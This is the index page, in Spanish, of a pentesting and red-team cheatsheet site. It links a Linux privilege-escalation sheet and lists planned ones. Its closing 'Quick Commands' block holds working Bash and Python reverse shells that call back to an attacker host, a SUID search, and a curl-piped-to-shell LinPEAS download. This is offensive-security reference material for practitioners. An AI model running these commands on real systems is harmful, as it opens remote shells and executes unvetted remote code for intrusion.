---
title: Cheatsheets
description: Referencias rápidas y comandos útiles para pentesting y red team
---

# 📋 Cheatsheets

Referencias rápidas, comandos y técnicas para tener siempre a mano.

---

## // Disponibles

<div class="card-grid">

<a href="linux-privesc/" class="card hover-lift neon-border">
  <div class="card-tag">linux</div>
  <h3 class="card-title">Linux Privilege Escalation</h3>
  <p class="card-description">SUID, capabilities, cron jobs, kernel exploits, sudo bypass y más técnicas de privesc.</p>
  <div class="card-meta">
    <span>Actualizado: 2025-01-08</span>
  </div>
</a>

</div>

---

## // Próximamente

<div class="card-grid">

<div class="card hover-lift" style="opacity: 0.6;">
  <div class="card-tag">windows</div>
  <h3 class="card-title">Windows Privilege Escalation</h3>
  <p class="card-description">Token impersonation, SeImpersonate, unquoted paths, DLL hijacking.</p>
</div>

<div class="card hover-lift" style="opacity: 0.6;">
  <div class="card-tag">web</div>
  <h3 class="card-title">Web Application Testing</h3>
  <p class="card-description">OWASP Top 10, SQLi, XSS, SSRF, authentication bypass.</p>
</div>

<div class="card hover-lift" style="opacity: 0.6;">
  <div class="card-tag">network</div>
  <h3 class="card-title">Network Enumeration</h3>
  <p class="card-description">Nmap, masscan, DNS enum, SMB, LDAP, Kerberos.</p>
</div>

<div class="card hover-lift" style="opacity: 0.6;">
  <div class="card-tag">ad</div>
  <h3 class="card-title">Active Directory</h3>
  <p class="card-description">BloodHound, Kerberoasting, Pass-the-Hash, Golden Ticket.</p>
</div>

<div class="card hover-lift" style="opacity: 0.6;">
  <div class="card-tag">reverse</div>
  <h3 class="card-title">Reverse Engineering</h3>
  <p class="card-description">GDB, Ghidra, IDA, radare2, análisis de binarios.</p>
</div>

<div class="card hover-lift" style="opacity: 0.6;">
  <div class="card-tag">tools</div>
  <h3 class="card-title">Tool Reference</h3>
  <p class="card-description">Metasploit, Burp Suite, sqlmap, hashcat, impacket.</p>
</div>

</div>

---

## // Quick Commands

```bash
# Reverse Shell - Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Reverse Shell - Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

---

!!! tip "Contribuciones"
    ¿Tienes comandos o técnicas útiles? Abre un issue en el [repositorio](https://github.com/0x574R).
